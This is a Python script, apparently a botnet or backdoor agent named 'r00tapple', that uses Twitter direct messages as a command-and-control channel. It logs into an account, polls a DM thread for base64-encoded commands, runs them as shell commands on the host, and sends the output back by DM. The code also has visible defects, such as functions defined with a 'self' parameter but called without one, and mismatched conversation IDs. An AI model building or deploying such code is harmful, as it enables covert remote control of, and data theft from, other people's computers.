from bs4 import BeautifulSoup
from requests.exceptions import ConnectionError
from uuid import getnode as get_mac
import json
import base64
import requests
import random
import sys
import string
import time
import threading
import subprocess
import platform
import time

#セッションを生成する
SESSION = requests.Session()
MAX_ENTRY_ID = ''
RESPONSE = ""
AUTH_TOKEN = ""

JOB_LIST = []
USERNAME = ""
PASSWORD = ""
DM_LINK = "https://twitter.com/messages/with/conversation?id=459072132-459072132&last_note_ts=3"
WAIT_TIME = "60"
MAC_ADDRESS = ':'.join(("%012x" % get_mac())[i:i + 2] for i in range(0, 12, 2))

class CommandToExecute:
    def __init__(self, message):
        try:
            data = json.loads(base64.b64decode(message))
            self.data = data
            self.sender = data['sender']
            self.receiver = data['receiver']
            self.cmd = data['cmd']
            self.jobid = data['jobid']
        except:
            return

    def is_for_me(self):
        global MAC_ADDRESS
        return MAC_ADDRESS == self.receiver or self.cmd == 'PING' and 'output' not in self.data

    def retrieve_command(self):
        return self.jobid, self.cmd

class CommandOutput:
    def __init__(self, sender, receiver, output, jobid, cmd):
        self.sender = sender
        self.receiver = receiver
        self.output = output
        self.cmd = cmd
        self.jobid = jobid

    def build(self):
        cmd = {'sender': self.sender,
               'receiver': self.receiver,
               'output': self.output,
               'cmd': self.cmd,
               'jobid': self.jobid
               }
        return base64.b64encode(json.dumps(cmd))

def dm_receive(self):
    global SESSION,RESPONSE,AUTH_TOKEN,JOB_LIST,MAX_ENTRY_ID
    print("[+]r00tapple -Receive Commands- ")
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-encoding": "gzip, deflate, sdch, br",
        "accept-language": "ja,en-US;q=0.8,en;q=0.6",
        "User-Agent": "Mozilla/5.0",
        "referer": "https://twitter.com/",
        "x-requested-with": "XMLHttpRequest"
    }

    try:
        #自分のアカウンのダイレクトメッセージのURLを記述
        dm = SESSION.get(DM_LINK, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
        #DMのJSONを取得
        dm = dm.json()
        #itemを取得
        items = dm['items']
    except:
        print("[+]命令の取得中にエラー")
        #再ログイン
        login()
        #処理を中断
        return

    #itemsに値がある場合のみ後続の処理を実行する
    if (items != '' and MAX_ENTRY_ID != ''):
        for line in dm['items']:
            soup = BeautifulSoup(items[line], "lxml")
            #ダイレクトメッセージのIDを取得
            dm_id = soup.find('div', attrs={'class':'DirectMessage'}).get('data-item-id')
            if (MAX_ENTRY_ID <= dm_id):
                """
             message = soup.find('p', attrs={'class':'TweetTextSize js-tweet-text tweet-text'}).string
             """
                message = soup.find('p', attrs={'class':'TweetTextSize js-tweet-text tweet-text'}).string
                message = soup.find('p', attrs={'class':'tweet-text'}).string
                cmd = CommandToExecute(message)
                if (cmd.is_for_me()):
                    jobid, cmd = cmd.retrieve_command()
                    if (jobid not in JOB_LIST):
                        if (cmd == 'PING'):
                            output = platform.platform()
                        else:
                            output = subprocess.check_output(cmd, shell=True, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
                        output_command = CommandOutput(MAC_ADDRESS, 'master', output, jobid, cmd)
                        dm_send(output_command.build())
                        JOB_LIST.append(jobid)
                        print("[+]受信命令の実行完了")
                        return
            else:
                print("[+]ダイレクトメッセージが存在しません")
                login()

def dm_send(message):
    #使用するグローバル変数を読みだす
    global SESSION,RESPONSE,AUTH_TOKEN

    headers = {
        "User-Agent": "Mozilla/5.0",
        "referer": "https://twitter.com/"
    }

    send = {
        "authenticity_token": AUTH_TOKEN,
        "conversation_id": "459072132-4590272132",
        "scribeContext[component]": "tweet_box_dm",
        "tagged_users": "",
        "text": message,
        "tweetboxid": "swift_tweetbox_1469593526714"
    }

    #DM送信処理
    try:
        RESPONSE = SESSION.post("https://twitter.com/i/direct_messages/new", data=send, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
    except:
        print("[+]命令送信失敗")
        # 再ログイン
        login()
        return

def login(self):
    global SESSION,RESPONSE,AUTH_TOKEN,MAX_ENTRY_ID

    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-encoding": "gzip, deflate, sdch, br",
        "accept-language": "ja,en-US;q=0.8,en;q=0.6",
        "User-Agent": "Mozilla/5.0",
        "referer": "https://twitter.com/",
        "x-requested-with": "XMLHttpRequest"
    }

    payload = {
        "session[username_or_email]": USERNAME,
        "session[password]": PASSWORD,
        "remember_me": "1",
        "return_to_ssl": "true",
        "scribe_log": "",
        "redirect_after_login": "/",
        "authenticity_token": AUTH_TOKEN
    }

    try:
        RESPONSE = SESSION.post("https://twitter.com/", allow_redirects=False, headers=headers)
        soup = BeautifulSoup(RESPONSE.text, "lxml")
        AUTH_TOKEN = soup.find(attrs={'name': 'authenticity_token'}).get('value')
        payload['authenticity_token'] = AUTH_TOKEN

    except Exception as e:
        print("[+]Twitterに接続できません")
        return

    try:
        #ログイン
        RESPONSE = SESSION.post("https://twitter.com/sessions", data=payload, allow_redirects=False, headers=headers)
        dm = SESSION.get(DM_LINK, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
    except:
        print("[+]ログイン失敗")
        return

    try:
        dm = SESSION.get(DM_LINK, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
        dm = dm.json()
        items = dm['items']
        MAX_ENTRY_ID = dm['max_entry_id']
    except:
        print("[+]ダイレクトメッセージのMAX_ENTRY_IDを取得できませんでした")
        return

if __name__ == '__main__':
    login()

    while(1):
        dm_receive()
        time.sleep(float(WAIT_TIME))
